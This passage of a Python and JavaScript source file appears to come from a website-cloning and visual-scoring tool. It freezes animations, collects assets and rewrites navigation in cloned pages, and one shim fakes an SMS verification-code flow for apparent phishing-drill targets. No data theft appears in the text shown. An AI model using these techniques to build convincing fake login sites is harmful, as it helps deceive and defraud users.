    if (has('wp') && w.wp && (w.wp.i18n || w.wp.hooks || w.wp.element)) out.push('WordPress');
    if (has('jQuery') && w.jQuery && w.jQuery.fn && w.jQuery.fn.jquery) out.push('jQuery');
    if (has('webpackJsonp') || Object.keys(w).some(k => k.startsWith('webpackChunk'))) out.push('Webpack');
    if (has('__svelte') || has('__SVELTEKIT_DEV__')) out.push('Svelte');
    // 挂载节点上的实例: React 18/19(__reactContainer$/__reactFiber$)、React<=17(_reactRootContainer)、
    // Vue3(__vue_app__)、Vue2(__vue__); 只看 body 下前几层, 不全树遍历
    const nodes = [document.body].concat(Array.from(document.querySelectorAll('body > *, body > * > *')).slice(0, 300));
    let react = false, vue = false;
    for (const el of nodes) {
      if (!el) continue;
      if (!react) {
        if (el._reactRootContainer) react = true;
        else for (const k in el) { if (k.startsWith('__reactContainer$') || k.startsWith('__reactFiber$')) { react = true; break; } }
      }
      if (!vue && (el.__vue_app__ || el.__vue__)) vue = true;
      if (react && vue) break;
    }
    if (react) out.push('React');
    if (vue) out.push('Vue');
  } catch (e) {}
  return Array.from(new Set(out));
}"""

# 克隆侧懒加载图一律转 eager 并等到齐: 资源全在本地沙盒, 整页截图前没被滚动窗口
# 触发的 loading=lazy 图(页尾赞助商墙/logo 栅格)在截图里是空格, 原站基准却是满的
# 只转基准时刻已到齐的图(采集侧打 data-clone-loaded): 基准里没到的图克隆也不强拉, 两侧同口径
CLONE_IMG_EAGER_JS = r"""() => {
  let n = 0;
  for (const im of document.images) {
    if (im.loading === 'lazy' && im.hasAttribute('data-clone-loaded')) { im.loading = 'eager'; n++; }
  }
  return n;
}"""
# 基准截图前: 文档序前 maxN 张懒加载图转 eager(页尾轮播/栅格没被滚动窗口触发的图);
# 不全转 —— 一次拉上百张会被图床限流成坏图(wix 页尾整片 alt 文字)
BASELINE_EAGER_JS = r"""(maxN) => {
  let n = 0;
  for (const im of document.images) {
    if (n >= maxN) break;
    if (im.loading !== 'lazy' || im.complete) continue;
    const r = im.getBoundingClientRect();
    if (r.width <= 1 || r.height <= 1) continue;
    im.loading = 'eager'; n++;
  }
  return n;
}"""
# 基准截图后: 给截图时刻已解码完成的图打标, 供克隆侧决定哪些懒加载图该强拉
MARK_LOADED_IMGS_JS = r"""() => {
  let n = 0;
  for (const im of document.images) {
    if (im.complete && im.naturalWidth > 0) { im.setAttribute('data-clone-loaded', '1'); n++; }
  }
  return n;
}"""
CLONE_IMG_DONE_JS = r"""() => {
  for (const im of document.images) {
    if (im.complete) continue;
    const r = im.getBoundingClientRect();
    if (r.width > 1 && r.height > 1) return false;
  }
  return true;
}"""

# 评分渲染专用(交付物不注入): 长周期 setInterval 不触发。基准是时间冻结的快照, 克隆页加载后
# 轮播自动翻页(周期 1.5~6s 的 setInterval, wix 模板墙是 1.5s)会在截图前翻到另一页 —— 与 ANIM_ALIGN_JS
# 对 CSS 动画做的对齐同理。setTimeout 不拦: 一次性的长延时常是内容装配(qwik 页尾
# 延时挂载, 拦掉后整页矮 85~150px), 拦它得不偿失
SCORE_TIMER_GUARD_JS = r"""(() => {
  try {
    const si = window.setInterval;
    window.setInterval = function (fn, ms) {
      if ((+ms || 0) >= 1000) return 0;
      return si.apply(this, arguments);
    };
  } catch (e) {}
})();"""

# 克隆侧视频对帧: 带 data-clone-vt 的视频暂停并跳到基准时刻; 返回需等待 seek 的个数
VIDEO_SEEK_JS = r"""() => {
  let n = 0;
  // 封面就是基准帧(媒体快照取的当前帧/基准截图裁图): 视频本身可播(资源在)时评分页直接
  // 显示封面 —— 本地沙盒不支持 Range, mp4 跳帧常落不到准确位置(svelte 纪录片 98→90)
  for (const v of document.querySelectorAll('video[data-clone-poster]')) {
    try {
      if (v.error || v.readyState < 1) continue;
      v.autoplay = false; v.pause();
      v.removeAttribute('data-clone-vt');
      v.removeAttribute('src');
      v.querySelectorAll('source').forEach(s => s.remove());
      v.load();
    } catch (e) {}
  }
  for (const v of document.querySelectorAll('video[data-clone-vt]')) {
    const t = parseFloat(v.getAttribute('data-clone-vt'));
    if (!(t >= 0)) continue;
    try { v.autoplay = false; v.pause(); v.currentTime = t; n++; } catch (e) {}
  }
  return n;
}"""
VIDEO_SEEK_DONE_JS = r"""() => {
  for (const v of document.querySelectorAll('video[data-clone-vt]')) {
    if (v.error || v.networkState === 3) continue;
    if (v.seeking || v.readyState < 2) return false;
  }
  return true;
}"""

# 视口内可见的 autoplay 视频都已有当前帧(readyState>=2); 出错/无源的不等
VIDEO_FRAME_READY_JS = r"""() => {
  for (const v of document.querySelectorAll('video[autoplay]')) {
    if (v.error || v.readyState >= 2 || v.networkState === 0 || v.networkState === 3) continue;
    const r = v.getBoundingClientRect();
    if (r.width > 1 && r.height > 1 && r.top < innerHeight && r.bottom > 0) return false;
  }
  return true;
}"""

# 时间冻结(基准截图前): 暂停全部 CSS/WAAPI 动画并清空页面定时器、停掉 rAF。
# 不改变当前画面, 只让"截图那一刻"一直保持到 DOM 序列化 —— 否则轮播/跑马灯在
# 截图与序列化之间继续前进, 克隆从另一个时刻起步(nuxt 案例墙错一屏、logo 带错相位)。
TIME_FREEZE_JS = r"""
() => {
  const out = {anims: 0, timers: 0};
  try {
    for (const a of document.getAnimations()) {
      if (a.playState !== 'running') continue;
      // 过渡(轮播翻页/展开收起)是两个稳态之间的一段: 冻在半途基准就是"两页各露一半",
      // 克隆静置在稳态, 整屏错位(mi.com 轮播 99.9→74.5)。过渡直接跳到终点, 循环动画才暂停
      if (typeof CSSTransition !== 'undefined' && a instanceof CSSTransition) {
        try { a.finish(); out.anims++; continue; } catch (e) {}
      }
      // 脚本发起的有限次动画(进视口入场、叠卡展开)同理跳到终点: 克隆里它们重放后停在终态,
      // 基准冻在半途两边就对不上(wix 模板墙); 无限循环的才暂停
      if (!(typeof CSSAnimation !== 'undefined' && a instanceof CSSAnimation)) {
        try {
          const t = a.effect && a.effect.getComputedTiming ? a.effect.getComputedTiming() : null;
          if (t && isFinite(t.endTime)) { a.finish(); out.anims++; continue; }
        } catch (e) {}
      }
      a.pause(); out.anims++;
    }
  } catch (e) {}
  try {
    const maxId = setTimeout(function () {}, 0);
    for (let i = 1; i <= maxId; i++) { clearTimeout(i); clearInterval(i); }
    out.timers = maxId;
  } catch (e) {}
  // 冻结后新挂的长定时器也不触发: 轮播常在补间结束(transitionend)时重挂下一次翻页,
  // 清掉旧定时器挡不住它, 序列化时已翻到下一页(wix 模板墙比基准快一页)。短定时器
  // (引擎自身的 120ms 等待、防抖)照常
  try {
    const st = window.setTimeout;
    window.setInterval = function () { return 0; };
    window.setTimeout = function (fn, ms) { return (+ms || 0) >= 500 ? 0 : st.apply(this, arguments); };
  } catch (e) {}
  // rAF 不在这里停: 定时器清掉后不会再起新一轮翻页, 但已在飞的 JS 补间(rAF 逐帧写
  // transform 的轮播)要让它走完, 否则基准冻在两页之间(wix 模板墙)。见 RAF_FREEZE_JS
  // 视频同样定格: 截图期间不再走帧, 媒体快照记下的进度就是截图里那一帧
  try { document.querySelectorAll('video').forEach(v => { if (!v.paused) v.pause(); }); } catch (e) {}
  return out;
}
"""

# 脚本动画(element.animate 的 WAAPI)烘焙(基准截图后, 时间冻结中): 它们不在样式表里、
# 序列化带不走, 克隆只剩动画开始前的静态版面 —— wix 模板墙用 WAAPI 转 3D 叠卡, 基准
# 停在哪一张克隆都显示初始那张。把被动画的属性按截图时刻的计算值写成内联 !important
WAAPI_BAKE_JS = r"""() => {
  let n = 0;
  const plan = [];
  const skip = new Set(['offset', 'easing', 'composite', 'computedOffset']);
  const kebab = (p) => p === 'cssFloat' ? 'float' : p.replace(/[A-Z]/g, m => '-' + m.toLowerCase());
  try {
    for (const a of document.getAnimations()) {
      if ((typeof CSSAnimation !== 'undefined' && a instanceof CSSAnimation) ||
          (typeof CSSTransition !== 'undefined' && a instanceof CSSTransition)) continue;
      const eff = a.effect, el = eff && eff.target;
      if (!el || !el.style || eff.pseudoElement) continue;
      const props = new Set();
      try { for (const kf of eff.getKeyframes()) for (const k in kf) if (!skip.has(k)) props.add(kebab(k)); } catch (e) {}
      if (!props.size) continue;
      const cs = getComputedStyle(el);
      plan.push([el, Array.from(props, p => [p, cs.getPropertyValue(p)])]);
      n++;
    }
  } catch (e) {}
  try { __SCOPED_BAKE__('w', plan); } catch (e) {}
  return n;
}""".replace("__SCOPED_BAKE__", "(" + SCOPED_BAKE_FN + ")")

RAF_FREEZE_JS = r"""() => { try { window.requestAnimationFrame = function () { return 0; }; } catch (e) {} }"""

# 动画相位固化(基准截图后、DEEP_FREEZE 前): 把每个元素 CSS 动画的当前进度写成
# 负 animation-delay, 克隆页加载即从截图那一刻的相位起播; 并打 data-clone-anim
# 标记, 评分侧据此把相位对齐到同一时刻再截图(见 ANIM_ALIGN_JS)。
ANIM_PHASE_JS = r"""
() => {
  let n = 0;
  const toMs = (v) => { v = (v || '0s').trim(); const f = parseFloat(v) || 0;
                        return v.endsWith('ms') ? f : f * 1000; };
  for (const el of document.querySelectorAll('*')) {
    let anims;
    try {
      // 只处理文档时间线上的动画: 滚动驱动(scroll()/view() 时间线)的进度由滚动位置决定,
      // currentTime 是百分比, 写成 delay 或对齐都会错
      anims = el.getAnimations().filter(a => a.animationName && a.effect &&
                                             a.timeline === document.timeline &&
                                             !a.effect.pseudoElement && typeof a.currentTime === 'number');
    } catch (e) { continue; }
    if (!anims.length) continue;
    try {
      const cs = getComputedStyle(el);
      const names = cs.animationName.split(',').map(x => x.trim());
      const delays = cs.animationDelay.split(',');
      const vals = names.map((nm, i) => {
        const d0 = toMs(delays[i % delays.length]);
        const a = anims.find(x => x.animationName === nm);
        return a ? Math.round(d0 - a.currentTime) + 'ms' : d0 + 'ms';
      });
      el.style.setProperty('animation-delay', vals.join(', '), 'important');
      el.setAttribute('data-clone-anim', '1');
      n++;
    } catch (e) {}
  }
  return n;
}
"""

# 评分侧相位对齐: 带 data-clone-anim 的动画回到起播相位(= 原站截图时刻)并暂停,
# 比较的是同一时刻的两张图; 交付的克隆页本身照常播放。
ANIM_ALIGN_JS = r"""
() => {
  let n = 0;
  for (const el of document.querySelectorAll('[data-clone-anim]')) {
    try {
      for (const a of el.getAnimations()) {
        if (!a.animationName || a.timeline !== document.timeline) continue;
        a.currentTime = 0; a.pause(); n++;
      }
    } catch (e) {}
  }
  return n;
}
"""

# 可见文本采集(含同源 iframe 内容, 保证克隆/原站两侧口径一致)
# 自适应缓释(三段式, 全部为同步脚本 + 受时限的 wait_for_function):
# 不能用"evaluate 一个 async Promise"实现 —— MHTML 保真轨页面脚本被禁用, 其
# setTimeout 永不触发, Promise 永不 resolve, 而 evaluate 没有超时 → 整个任务挂死。
SETTLE_INSTALL_JS = r"""({quiet}) => {
  try {
    const w = window;
    w.__cloneSettle = {last: performance.now(), quiet: quiet, mo: null};
    const mo = new MutationObserver(() => { w.__cloneSettle.last = performance.now(); });
    mo.observe(document.documentElement, {subtree: true, childList: true,
                                          attributes: true, characterData: true});
    w.__cloneSettle.mo = mo;
    return true;
  } catch (e) { return false; }
}"""

SETTLE_READY_JS = r"""() => {
  const s = window.__cloneSettle;
  if (!s) return true;
  try { if (document.fonts && document.fonts.status === 'loading') return false; } catch (e) {}
  const imgs = document.images;
  for (let i = 0; i < imgs.length; i++) { if (!imgs[i].complete) return false; }
  return performance.now() - s.last >= s.quiet;
}"""

SETTLE_CLEANUP_JS = r"""() => {
  const s = window.__cloneSettle;
  try { if (s && s.mo) s.mo.disconnect(); } catch (e) {}
  try { delete window.__cloneSettle; } catch (e) {}
}"""

TEXT_EXTRACT_JS = r"""
() => {
  let out = '';
  try { out += document.body ? document.body.innerText : ''; } catch (e) {}
  document.querySelectorAll('iframe').forEach(f => {
    try {
      // 只计可见 iframe: 隐藏/零尺寸 iframe(预加载沙箱、以 text/plain 打开的样式表等)
      // 的文字不在画面上, 计入会让文本通道按不可见内容扣分
      const r = f.getBoundingClientRect();
      const cs = getComputedStyle(f);
      if (r.width < 2 || r.height < 2 || cs.visibility === 'hidden' || cs.display === 'none') return;
      const d = f.contentDocument;
      if (d && d.body) out += '\n' + d.body.innerText;
    } catch (e) {}
  });
  return out.slice(0, 30000);
}
"""

# 全部 iframe 的绝对 src(含跨域; 跨域 contentDocument 不可读, 需顶级渲染固化)
IFRAME_SRCS_JS = r"""
() => {
  const out = [];
  document.querySelectorAll('iframe[src]').forEach(f => {
    const raw = f.getAttribute('src') || '';
    if (!raw || raw.startsWith('about:') || raw.startsWith('javascript:') || raw.startsWith('data:')) return;
    // 不可见 iframe(埋点/转化像素, 0x0 或隐藏)不固化: 每个都要整页导航 + 退化重试,
    // 视觉上毫无贡献(wix 两个 doubleclick 像素白耗约 11s)
    try {
      const r = f.getBoundingClientRect();
      const cs = getComputedStyle(f);
      if (r.width <= 2 || r.height <= 2 || f.clientWidth <= 2 || f.clientHeight <= 2 || cs.display === 'none' || cs.visibility === 'hidden') return;
    } catch (e) {}
    try { out.push(new URL(raw, location.href).href); } catch (e) {}
  });
  return out.slice(0, 10);
}
"""

# 基准后塌陷回撤: 基准截图时可见且尺寸稳定的块(layout_map 稳定项), 到序列化前被页面
# 脚本用内联 display:none 收起 —— 典型是广告位竞价落空后 GPT collapseEmptyDivs 把空位
# 连同外框一起收掉(techcrunch 14 个位整列上移 600px)。克隆按基准口径保留占位:
# 只去掉内联 display:none, 不碰类名/样式表; 基准里本就不可见的块不在稳定项里, 不受影响。
COLLAPSE_REVERT_JS = r"""
(keys) => {
  let n = 0;
  for (const k of keys) {
    let el = null;
    try { el = document.querySelector(k); } catch (e) { continue; }
    if (!el || !el.style || el.style.display !== 'none') continue;
    el.style.removeProperty('display');
    n++;
    // 收起常是一层层做的(位 + 外框): 祖先同样被内联收起的一并回撤
    for (let p = el.parentElement; p && p !== document.body; p = p.parentElement) {
      if (p.style && p.style.display === 'none') { p.style.removeProperty('display'); n++; }
    }
  }
  return n;
}
"""

# 克隆侧塌陷探针(布局校准用): 原站基准可见、克隆里被脚本内联 display:none 收起的块
# (离线时广告/推荐位请求失败, 站点脚本把空位收掉; 采集侧回撤挡不住回放时再收一次)。
# 返回 [路径, 去掉内联后样式表给出的 display], 由校准样式以 !important 压回。
COLLAPSED_PROBE_JS = r"""
(keys) => {
  const out = [];
  for (const k of keys) {
    let el = null;
    try { el = document.querySelector(k); } catch (e) { continue; }
    if (!el || !el.style || el.style.display !== 'none') continue;
    const prev = el.style.getPropertyValue('display'), pri = el.style.getPropertyPriority('display');
    el.style.removeProperty('display');
    const d = getComputedStyle(el).display;
    el.style.setProperty('display', prev, pri);
    if (d && d !== 'none') out.push([k, d]);
  }
  return out.slice(0, 40);
}
"""

# 不可见 iframe(与 IFRAME_SRCS_JS 同口径)打标: 它们不固化, 若保留活体 src, 克隆每次渲染
# 都会经反代/直连加载埋点沙盒(Shopify web-pixels 等), 同源进程内跑脚本拖垮评分渲染
MARK_HIDDEN_FRAMES_JS = r"""
() => {
  let n = 0;
  document.querySelectorAll('iframe[src]').forEach(f => {
    const raw = f.getAttribute('src') || '';
    if (!raw || /^(about:|javascript:|data:)/i.test(raw)) return;
    try {
      const r = f.getBoundingClientRect();
      const cs = getComputedStyle(f);
      if (r.width <= 2 || r.height <= 2 || f.clientWidth <= 2 || f.clientHeight <= 2 || cs.display === 'none' || cs.visibility === 'hidden') {
        f.setAttribute('data-clone-hidden-frame', '1'); n++;
      }
    } catch (e) {}
  });
  return n;
}
"""

_HIDDEN_FRAME_TAG_RE = re.compile(r'<iframe\b[^>]*\bdata-clone-hidden-frame\b[^>]*>', re.I)
_TAG_SRC_RE = re.compile(r'(\ssrc\s*=\s*)(?:"[^"]*"|\'[^\']*\'|[^\s>]+)', re.I)


def _blank_hidden_frames(html: str):
    """打标的不可见 iframe 的 src 置为 about:blank, 返回 (html, 个数)。"""
    n = 0

    def _fix(m):
        nonlocal n
        n += 1
        return _TAG_SRC_RE.sub(lambda s: s.group(1) + '"about:blank"', m.group(0), count=1)
    return _HIDDEN_FRAME_TAG_RE.sub(_fix, html or ""), n


COLLECT_ASSETS_JS = r"""
() => {
  const urls = [];
  const srcsets = [];
  const rawRefs = [];
  const seen = new Set();
  const seenSet = new Set();
  const seenRaw = new Set();
  const add = (u) => {
    if (!u) return;
    u = String(u).trim();
    if (!u || u.startsWith('data:') || u.startsWith('blob:') || u.startsWith('#') || u.startsWith('%23')
        || u.startsWith('javascript:') || u.startsWith('mailto:') || u.startsWith('tel:')) return;
    try {
      const abs = new URL(u, document.baseURI).href;
      if (abs.startsWith('http')) {
        if (!seen.has(abs)) { seen.add(abs); urls.push(abs); }
        const key = u + '=>' + abs;
        if (!seenRaw.has(key)) { seenRaw.add(key); rawRefs.push([u, abs]); }
      }
    } catch (e) { return; }
  };
  const addSet = (s) => {
    if (!s) return;
    s = String(s).trim();
    if (s && !seenSet.has(s)) { seenSet.add(s); srcsets.push(s); }
  };
  document.querySelectorAll('link[href]').forEach(el => {
    const rel = (el.getAttribute('rel') || '').toLowerCase();
    if (rel.includes('stylesheet') || rel.includes('icon') || rel.includes('preload') || rel.includes('prefetch')) {
      add(el.getAttribute('href'));
    }
  });
  document.querySelectorAll('script[src]').forEach(el => add(el.getAttribute('src')));
  document.querySelectorAll('img').forEach(el => {
    add(el.getAttribute('src'));
    add(el.getAttribute('data-src'));
    add(el.getAttribute('data-original'));
    addSet(el.getAttribute('srcset'));
    addSet(el.getAttribute('data-srcset'));
  });
  document.querySelectorAll('picture source, source, video, audio').forEach(el => {
    add(el.getAttribute('src'));
    add(el.getAttribute('data-src'));
    addSet(el.getAttribute('srcset'));
    addSet(el.getAttribute('data-srcset'));
  });
  // video poster 封面帧
  document.querySelectorAll('video[poster]').forEach(el => add(el.getAttribute('poster')));
  // 内联 SVG 外部雪碧图 <use href> / <image xlink:href>
  document.querySelectorAll('svg image, svg use, image').forEach(el => {
    add(el.getAttribute('href'));
    add(el.getAttribute('xlink:href'));
  });
  // 内联 style 与 <style> 块中的 url(...)(含 background/mask/@font-face)
  const scanStyle = (s) => {
    if (!s) return;
    const re = /url\((['"]?)([^'")]+)\1\)/g;
    let m;
    while ((m = re.exec(String(s))) !== null) add(m[2]);
  };
  document.querySelectorAll('[style]').forEach(el => scanStyle(el.getAttribute('style')));
  document.querySelectorAll('style').forEach(el => scanStyle(el.textContent));
  return { urls: urls, srcsets: srcsets, rawRefs: rawRefs };
}
"""

IFRAME_EXTRACT_JS = r"""
() => {
  const out = [];
  document.querySelectorAll('iframe').forEach(f => {
    try {
      const raw = f.getAttribute('src') || '';
      if (!raw || raw.startsWith('about:') || raw.startsWith('javascript:')) return;
      const abs = new URL(raw, location.href);
      if (abs.origin !== location.origin) return;  // 仅同源 iframe 可读取
      const doc = f.contentDocument;
      if (!doc || !doc.documentElement) return;
      const urls = [], srcsets = [], rawRefs = [];
      const seen = new Set(), seenSet = new Set();
      const add = (u) => {
        if (!u) return;
        u = String(u).trim();
        if (!u || u.startsWith('data:') || u.startsWith('blob:') || u.startsWith('#') || u.startsWith('%23')) return;
        try {
          const a = new URL(u, doc.baseURI || abs.href).href;
          if (a.startsWith('http') && !seen.has(a)) { seen.add(a); urls.push(a); rawRefs.push([u, a]); }
        } catch (e) { return; }
      };
      const addSet = (s) => {
        s = String(s || '').trim();
        if (s && !seenSet.has(s)) { seenSet.add(s); srcsets.push(s); }
      };
      doc.querySelectorAll('link[href],script[src],img,source,video,audio,svg image,svg use').forEach(el => {
        add(el.getAttribute('href'));
        add(el.getAttribute('xlink:href'));
        add(el.getAttribute('src'));
        add(el.getAttribute('data-src'));
        addSet(el.getAttribute('srcset'));
        addSet(el.getAttribute('data-srcset'));
      });
      doc.querySelectorAll('video[poster]').forEach(el => add(el.getAttribute('poster')));
      doc.querySelectorAll('[style]').forEach(el => {
        const s = el.getAttribute('style') || '';
        const re = /url\((['"]?)([^'")]+)\1\)/g;
        let m;
        while ((m = re.exec(s)) !== null) add(m[2]);
      });
      out.push({ src: abs.href, html: '<!DOCTYPE html>\n' + doc.documentElement.outerHTML,
                 urls: urls, srcsets: srcsets, rawRefs: rawRefs });
    } catch (e) { return; }
  });
  return out.slice(0, 5);
}
"""

COLLECT_LINKS_JS = r"""
() => {
  const out = [];
  const seen = new Set();
  const skipExt = /\.(png|jpe?g|gif|svg|webp|avif|bmp|ico|css|js|mjs|json|xml|pdf|zip|gz|rar|7z|tar|mp4|webm|mp3|wav|ogg|woff2?|ttf|eot|otf)$/i;
  document.querySelectorAll('a[href]').forEach(a => {
    const h = a.getAttribute('href');
    if (!h || h.startsWith('#') || h.startsWith('mailto:') || h.startsWith('tel:') || h.startsWith('javascript:')) return;
    try {
      const u = new URL(h, document.baseURI);
      if (u.origin !== location.origin) return;
      const p = u.pathname.replace(/\/+$/, '');
      if (!p || skipExt.test(p)) return;
      if (!seen.has(p)) { seen.add(p); out.push(p); }
    } catch (e) { return; }
  });
  return out.slice(0, 120);
}
"""

# SPA 路径伪装 + 导航逃逸护栏: 仅在平台 /preview/<id>/ 环境下生效,
# 生成的独立工程中自动短路(__CLONE_PREVIEW_BASE__ 未定义 -> 原生行为)。
JS_NAV_GUARD_SCRIPT = r"""<script data-clone-preview="nav-guard">window.__cloneNav=function(u,how){try{var b=window.__CLONE_PREVIEW_BASE__;if(!b){if(how==='open'){return window.open(u,'_self');}return null;}var s=String(u==null?'':u);if(!s||s.charAt(0)==='#'){return null;}if(/^(https?:)?\/\//i.test(s)){if(s.indexOf(location.origin)===0){s=s.slice(location.origin.length);}else{return null;}}location.href=b+s.replace(/^\/+/,'');}catch(e){}return null;};window.__cloneLoc=function(w){try{if(!window.__CLONE_PREVIEW_BASE__){return w==='top'?window.top.location:parent.location;}if(!window.__cloneLocProxy){window.__cloneLocProxy={set href(v){window.__cloneNav(v,'self');},replace:function(v){window.__cloneNav(v,'self');},assign:function(v){window.__cloneNav(v,'self');},reload:function(){},toString:function(){return location.href;}};}return window.__cloneLocProxy;}catch(e){return location;}};</script>"""

# 短信验证码交互仿真垫片: 原站"获取验证码"依赖后端会话状态, 克隆环境会静默
# 失败; 统一补上 60s 倒计时 + 已发送提示, 让演练目标获得完整交互闭环。
# [已弃用] 旧 V2 短链 shim(含"仿真环境"toast 与重复倒计时), 功能由 INTERACTION_SIM 覆盖
SMS_SIM_SHIM_SCRIPT = r"""<script data-clone-preview="sms-shim">(function(){var RE=/获取.{0,4}验证码|发送.{0,4}验证码|重新发送|获取动态码/;function txt(e){return (e.textContent||'').replace(/\s+/g,'');}function bind(root){try{var els=(root||document).querySelectorAll('button,a,[role=button],span,div');for(var i=0;i<els.length;i++){var e=els[i];if(e.__smsShim)continue;if(!RE.test(txt(e))||txt(e).length>14)continue;e.__smsShim=1;e.addEventListener('click',function(ev){var t=ev.currentTarget;ev.stopPropagation();if(t.__smsT)return;t.__smsT=1;var s=60;var orig=txt(t);var timer=setInterval(function(){s--;if(s<=0){clearInterval(timer);t.__smsT=0;t.textContent=orig;return;}t.textContent='重新发送('+s+'s)';},1000);t.textContent='重新发送(60s)';try{var tip=document.createElement('div');tip.textContent='验证码已发送(仿真环境)';tip.style.cssText='position:fixed;top:18px;left:50%;transform:translateX(-50%);background:#0f172a;color:#e2e8f0;padding:8px 16px;border-radius:8px;font-size:12px;z-index:99999;box-shadow:0 4px 16px rgba(0,0,0,.4)';document.body.appendChild(tip);setTimeout(function(){tip.remove();},2200);}catch(_){}},false);}}catch(_){}}bind(document);try{new MutationObserver(function(){bind(document);}).observe(document.documentElement,{childList:true,subtree:true});}catch(_){}})();</script>"""

SPA_DISGUISE_TEMPLATE = JS_NAV_GUARD_SCRIPT + r"""<script data-clone-preview="spa-disguise">(function(){try{var m=location.pathname.match(/^\/preview\/(\d+)(?:\/(.*))?$/);if(!m)return;var base='/preview/'+m[1]+'/';window.__CLONE_PREVIEW_BASE__=base;var orig=__ORIG_PATH_JSON__;try{history.replaceState(null,'',base+String(orig||'/').replace(/^\/+/,''));}catch(e){}var fixFr=function(){var fs=document.querySelectorAll('iframe[src^="/"]');for(var i=0;i<fs.length;i++){var s=fs[i].getAttribute('src')||'';if(s.indexOf(base)===0||s.indexOf('//')===0)continue;fs[i].setAttribute('src',base+s.replace(/^\//,''));}};try{fixFr();}catch(e){}document.addEventListener('DOMContentLoaded',function(){try{fixFr();}catch(e){}});try{new MutationObserver(function(){fixFr();}).observe(document.documentElement,{childList:true,subtree:true});}catch(e){}document.addEventListener('click',function(ev){var t=ev.target;var a=t&&t.closest?t.closest('a[href^="/"]'):null;if(!a)return;var href=a.getAttribute('href')||'';if(href.indexOf(base)===0||href.indexOf('//')===0)return;ev.preventDefault();location.href=base+href.replace(/^\//,'');},true);}catch(e){}})();</script>"""

# JS 导航逃逸改写: 克隆页运行时 SSO/会话脚本常以 window.open(url,'_self') /
# parent.location.href = url / window.top.location = uri 做整页跳转; 在平台
# 预览 iframe 内这会逃逸到平台路由(如 '/' 渲染出平台自身 UI)。统一改写为
# __cloneNav/__cloneLoc 桩: 预览基座存在时重定向回 /preview/<id>/, 独立
# Flask 工程中保持原生行为。
JS_NAV_OPEN_RE = re.compile(
    r"window\.open\(([^()]{1,300}?),\s*(['\"])_(self|top|parent)\2\s*\)")
JS_TOP_ASSIGN_RE = re.compile(
    r"(?:\bwindow\.top|(?<![\w$.])top)\.location\s*=\s*([^;{}]{1,300})")
JS_TOP_HREF_RE = re.compile(
    r"(?:\bwindow\.top|(?<![\w$.])top)\.location\.href\s*=")
JS_PARENT_LOC_RE = re.compile(
    r"(?:\bwindow\.parent|(?<![\w$.])parent)\.location(?:\.href)?\s*=")


def _anchored_sub(pattern, template: str, text: str, anchor: str, lead: str = "window.") -> str:
    """等价于 pattern.sub(template, text), 但只在字面锚点附近试配。

    适用前提(调用方保证): pattern 的每个匹配都包含字面量 anchor, 且匹配起点
    只可能是 anchor 本身或其前方紧邻的 lead。于是全部可能的匹配起点 =
    {q-len(lead), q | q ∈ anchor 出现位置}, 按升序在其上 match, 跳过与上个
    匹配重叠者 —— 与 re.sub 的"最左、非重叠"语义逐位一致。lookbehind/\b
    在 match(pos) 时仍能看到 pos 之前的字符(sre 以串首为边界)。
    旧实现 4 趟全串正则, 以交替开头的模式无法用字面前缀加速, 3MB JS 每趟
    ~120ms; 锚点用 str.find(C 层快速子串查找), 几乎零成本。"""
    q = text.find(anchor)
    if q < 0:
        return text
    out, last, back = [], 0, len(lead)
    while q >= 0:
        for start in ((q - back, q) if q >= back else (q,)):
            if start < last:
                continue
            m = pattern.match(text, start)
            if m:
                out.append(text[last:start])
                out.append(m.expand(template))
                last = m.end()
                break
        q = text.find(anchor, max(q + 1, last))
    if not out:
        return text
    out.append(text[last:])
    return "".join(out)


def rewrite_js_navigation(text: str) -> str:
    """JS/内联脚本导航逃逸改写(见上方注释; 幂等, 可重复应用)。"""
    if "window.open(" in text:   # 模式以字面量开头, sre 自带前缀快速扫描
        text = JS_NAV_OPEN_RE.sub(r"window.__cloneNav(\1,'_\3')", text)
    text = _anchored_sub(JS_TOP_ASSIGN_RE, r"window.__cloneLoc('top').href = \1", text, "top.location")
    text = _anchored_sub(JS_TOP_HREF_RE, "window.__cloneLoc('top').href =", text, "top.location")
    text = _anchored_sub(JS_PARENT_LOC_RE, "window.__cloneLoc('parent').href =", text, "parent.location")
    return text

CSS_URL_RE = re.compile(r"url\(\s*(['\"]?)([^'\")]+)\1\s*\)", re.I)
# 同时覆盖 @import url(...) 与 @import "..." 两种语法
CSS_IMPORT_RE = re.compile(
    r"""@import\s+(?:url\(\s*['"]?(?P<u1>[^'")]+?)['"]?\s*\)|['"](?P<u2>[^'"]+)['"])""",
    re.I,
)
# image-set("a.png" 1x, url("b.png") 2x) 候选提取
CSS_IMAGE_SET_RE = re.compile(r"image-set\(\s*([^)]*?)\s*\)", re.I)

ASSET_SKIP_PREFIXES = ("data:", "blob:", "#", "%23", "javascript:", "mailto:", "tel:")  # %23: 编码后的片段引用(SVG url(#id))

# CAS 防污染: 这些类别的资源若返回 HTML 拦截页则拒绝入库
PROTECTED_CATEGORIES = {"css", "js", "img", "fonts", "media"}
HTML_INTERCEPT_TYPES = ("text/html", "application/xhtml+xml")

# 视为静态资产的 Playwright resource_type 集合(活体采集/离线评分共用)
ASSET_RESOURCE_TYPES = {"stylesheet", "script", "image", "font", "media", "other"}
_LIVE_BODY_TYPES = {"stylesheet", "script", "image", "font"}   # media 多为分段流(206), 不复用
# 脚本 fetch/xhr 取回的静态媒体(MSE 推流的 webm/mp4 分段、WebGL 场景/贴图、序列帧):
# 资源类型是 fetch/xhr 而非 media/image, 旧口径既不采集也不在评分时报缺失 —— 苹果类
# 产品页的滚动叙事视频整段在克隆里 404。按扩展名/内容类型认作资产
RUNTIME_ASSET_EXT_RE = re.compile(
    r"\.(?:mp4|m4v|webm|mov|m4s|m4a|mp3|aac|ogg|ogv|ts|m3u8|mpd|"
    r"png|jpe?g|gif|webp|avif|svg|ktx2?|basis|hdr|exr|glb|gltf|bin|drc|usdz|lsd|wasm|"
    r"woff2?|ttf|otf)$", re.I)
RUNTIME_ASSET_CTYPES = ("video/", "audio/", "image/", "model/", "font/",
                        "application/vnd.apple.mpegurl", "application/dash+xml",
                        "application/wasm")


def _is_runtime_asset(url: str, ctype: str = "") -> bool:
    """fetch/xhr 请求是否其实是静态资产(见 RUNTIME_ASSET_EXT_RE)。"""
    ctype = (ctype or "").split(";")[0].strip().lower()
    if ctype and ctype.startswith(RUNTIME_ASSET_CTYPES):
        return True
    return bool(RUNTIME_ASSET_EXT_RE.search(urlsplit(url).path or ""))


_GENERIC_NAME_RE = re.compile(r"[0-9a-z]*[0-9][0-9a-z]*", re.I)


def _distinctive_asset_name(name: str) -> bool:
    """文件名能否跨路径/跨任务唯一指认字节(全局名字索引的前提)。

